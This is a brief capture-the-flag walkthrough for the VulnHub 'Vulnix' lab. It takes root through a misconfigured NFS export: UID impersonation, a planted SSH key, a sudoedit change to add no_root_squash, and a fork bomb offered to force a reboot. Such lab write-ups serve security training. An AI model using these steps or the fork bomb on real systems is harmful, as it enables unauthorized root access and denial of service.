--------------------------------
# Author Shubham Ranpise
--------------------------------

# 17/december/2022

# Vulnix

----------------------------------------------------------------
# nmap scan (smtp running on 25)
----------------------------------------------------------------
PORT     STATE SERVICE    VERSION
22/tcp   open  ssh        OpenSSH 5.9p1 Debian 5ubuntu1 (Ubuntu Linux; protocol 2.0)
25/tcp   open  smtp       Postfix smtpd
79/tcp   open  finger     Linux fingerd
110/tcp  open  pop3?
111/tcp  open  rpcbind    2-4 (RPC #100000)
143/tcp  open  imap       Dovecot imapd
512/tcp  open  exec?
513/tcp  open  login
514/tcp  open  tcpwrapped
993/tcp  open  ssl/imap   Dovecot imapd
995/tcp  open  ssl/pop3s?
2049/tcp open  nfs_acl    2-3 (RPC #100227)

----------------------------------------------------------------
got shares listed and connected to local machine
----------------------------------------------------------------
-> showmount -e 10.0.2.13
Export list for 10.0.2.13:
/home/vulnix *
sudo mount 10.0.2.13:/home/vulnix /home/kali/Desktop/gitlab/vulnhub/VULNIX/mntt -o vers=3
make new user as vulnix with 2008 id because mounted directory have 2008 id
-> su vulnix
you can acces the mounted directory

make ssh keys and put pub key in mounted share /.ssh/authorized_keys
-> ssh-keygen -t ssh-rsa
access via ssh
-> ssh -o 'PubkeyAcceptedKeyTypes +ssh-rsa' -i id_rsa vulnix@10.0.2.13

you got shell

----------------------------------------------------------------
privilege escalation
----------------------------------------------------------------
-> sudo -l
we can run sudoedit /etc/export
without root password with root previleges
so add this line in that file
-> /root   *(rw,no_root_squash)
we need to reboot the machine in real life 
this will spawn unlimited ps and force the machine to reboot
->   :(){:|:&};:
in our setuation we can simply reboot the vm :)
chek the shares are visible or not
-> showmount -e 10.0.2.13
Export list for 10.0.2.13:
/root        *
/home/vulnix *
mount the root share
-> sudo mount 10.0.2.13:/root /home/kali/Desktop/gitlab/vulnhub/VULNIX/mntroot -o vers=3
-> sudo ls -la mntroot 
-> sudo cat mntroot/trophy.txt
cc614640424f5bd60ce5d5264899c3be
 we got flag but we didnt got shell
am i only upset here?
so do the same thing as we did with vulnix user
we got root shell with ssh
happy hacking